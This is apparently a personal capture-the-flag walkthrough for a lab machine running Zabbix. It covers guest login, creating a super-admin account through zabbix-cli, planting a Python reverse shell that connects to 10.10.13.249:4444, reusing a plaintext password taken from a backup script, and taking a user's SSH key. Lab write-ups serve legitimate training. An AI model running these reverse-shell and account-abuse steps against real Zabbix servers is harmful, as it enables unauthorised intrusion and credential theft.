@@ -1,0 +1,64 @@
+#10.10.10.108
+#PORT- 22, 80, 10050(zabbix)
+
+#nmap full tcp scan
+#website:- 10.10.10.108/zabbix
+
+#login as guest
+#click overview
+
+#USER= zapper
+#PASSWD= zapper
+
+#use zabbix-cli to connext with that
+#set the url 
+zabbix-cli-init --zabbix-url http://10.10.10.108/zabbix
+zabbix-cli
+
+--------------------------------------------------------------------------
+#INSIDE ZABBIX-CLI
+--------------------------------------------------------------------------
+#1st create usergroup with name of 'All-users'
+create_usergroup
+#2nd create user with full access
+create_user
+# Alias []: asd
+# Name []: asd
+# Surname []: asd
+# Password []: asd
+# User type [1]: 3		(3= Super admin)
+# Autologin [0]: 1		(1= Enable)		
+# Autologout [86400]: 
+# Usergroups []: Zabbix administrators
+
+#login into GUI with 'asd'
+#go to "Administration --> Scripts --> create scripts"
+#execute on = zabbix-agent
+#add reverse shell command
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.249",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+#execute this : go to "Monitoring --> trigers --> Triggers status(any) &  Events(show all 7 days) : filter "
+#click on zipper then script name
+
+
+--------------------------------------------------------------------------------
+#INSIDE LOW PRIVILEGE SEHLL
+--------------------------------------------------------------------------------
+#user found 'zapper'
+#found 2 files inside /home/zapper/utils/ 'backup.sh' & 'zabbix-service'
+#check backup.sh file
+#PASSWD= ZippityDoDah        (for zapper user)
+#shell spawn
+python3 -c 'import pty;pty.spawn("/bin/sh")'
+su - zapper
+#PASSWD= ZippityDoDah
+
+#key
+aa29e93f48c64f8586448b6f6e38fe33
+
+
+#####################################################################
+#download private ssh_key of 'zapper' user to connect directly through ssh  OR  for stable shell
+#connect using ssh_key
+ssh -i ssh_key(zapper) zapper@10.10.10.108
+#then follow the steps from create c program to get root
+#####################################################################
